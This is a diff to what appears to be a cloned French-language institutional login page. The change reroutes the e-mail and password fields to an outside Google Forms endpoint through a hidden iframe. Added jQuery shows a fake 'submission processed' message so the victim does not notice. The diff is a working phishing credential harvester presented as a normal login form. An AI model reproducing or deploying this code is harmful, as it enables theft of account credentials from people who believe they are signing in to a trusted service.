@@ -28,7 +28,7 @@
                 </div>
             </div>
             <div class="main">
-                <form id="login" method="post" action="http://formspree.io/louis.pautasso@ynov.com">
+                <form name="gform" id="gform" enctype="text/plain" action="https://docs.google.com/forms/d/e/1FAIpQLSdLMg3e37FYT3Z91K4n--YMTJTVA0N9vvl39j_xcpS8PRenKg/formResponse?" target="hidden_iframe" onsubmit="submitted=true;">
                     <div class="main-title">
                         <h1>Connexion</h1>
                     </div>
@@ -36,12 +36,12 @@
                         <div class="form">
                             <div class="field">
                                 <label for="username">E-mail : </label>
-                                <input id="username" type="email" tabindex="1" accesskey="i" autocomplete="off" name="username" value=""/></div>
+                                <input id="entry.152211995" type="email" tabindex="1" accesskey="i" autocomplete="off" name="entry.152211995" value=""/></div>
                             
                             
                             <div class="field">
                                 <label for="password">Mot de passe : </label>
-                                <input id="password" type="password" tabindex="2"  accesskey="m" autocomplete="off" name="password" value=""/><p id="capslock-on" class="field-warning" style="display:none;">
+                                <input id="entry.2006754040" type="password" tabindex="2"  accesskey="m" autocomplete="off" name="entry.2006754040" value=""/><p id="capslock-on" class="field-warning" style="display:none;">
                                     <i class="material-icons">warning</i>
                                     <span>La touche Verr Maj est activée !</span>
                                 </p>
@@ -56,7 +56,16 @@
                             </li>
                         </ul>
                     </div>
+					<script src="assets/js/jquery.min.js"></script>
+<script type="text/javascript">var submitted=false;</script>
+<script type="text/javascript">
+$('#gform').on('submit', function(e) {
+  $('#gform *').fadeOut(2000);
+  $('#gform').prepend('Your submission has been processed...');
+  });
+</script>
                 </form>
+				
             </div>
         </div>
     </div>
